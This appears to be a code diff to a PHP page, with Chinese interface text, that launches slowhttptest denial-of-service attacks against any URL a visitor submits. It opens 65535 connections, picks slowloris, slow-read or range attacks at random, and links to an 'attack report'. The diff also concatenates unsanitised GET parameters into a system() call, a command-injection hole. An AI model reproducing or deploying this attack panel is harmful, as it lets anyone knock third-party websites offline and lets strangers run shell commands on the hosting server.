@@ -83,19 +83,27 @@ input:focus { box-shadow: inset 0 -5px 45px rgba(100,100,100,0.4), 0 1px 1px rgb
     <?php
 	
     $place=rand();
-    $time=$_POST['time'];
-    $pro=$_POST['proxy'];
+    $time=$_GET['time'];
+    $pro=$_GET['proxy'];
 
-    $cmd = "slowhttptest -c 65535 -l ".$_POST['time']." -u ".$_POST['url']." -X -g -o reports/".$place." >/tmp/tmp_test &";
+    $cmd = "slowhttptest -c 65535 -l ".$_GET['time']." -u ".$_GET['url']." -g -o reports/".$place;
     
     if($pro)
-       $cmd = "slowhttptest -c 65535 -l ".$_POST['time']." -u ".$_POST['url']." -d ".$pro." -X -g -o reports/".$place." >/tmp/tmp_test &";
+       $cmd = "slowhttptest -c 65535 -l ".$_GET['time']." -u ".$_GET['url']." -d ".$pro." -g -o reports/".$place;
+
+	if($place % 3 == 0) $cmd=$cmd." -X  >/tmp/tmp_test &";
+	if($place % 3 == 1) $cmd=$cmd." -R  >/tmp/tmp_test &";
+	if($place % 3 == 2) $cmd=$cmd." -H  >/tmp/tmp_test &";
+	
+	if($place % 3 == 0) $go="X";
+	if($place % 3 == 1) $go="R";
+	if($place % 3 == 2) $go="H";
 
 	//echo $cmd;
 	
     system($cmd);
 
-    echo "<center><font color=white>您可以在</font><font color=lightblue>",$time,"秒之后</font><font color=white>查看攻击报告：<br>","<a href=reports/".$place.".html class=btn btn-primary btn-block btn-large>Report</a></font></center><br><br>";
+    echo "<center><font color=white>您可以在</font><font color=lightblue>",$time,"秒之后</font><font color=white>查看".$go."攻击报告：<br>","<a href=reports/".$place.".html class=btn btn-primary btn-block btn-large>Report</a></font></center><br><br>";
 
     ?>
 <a class="btn btn-primary btn-block btn-large" href="index.html">返回首页.</a>
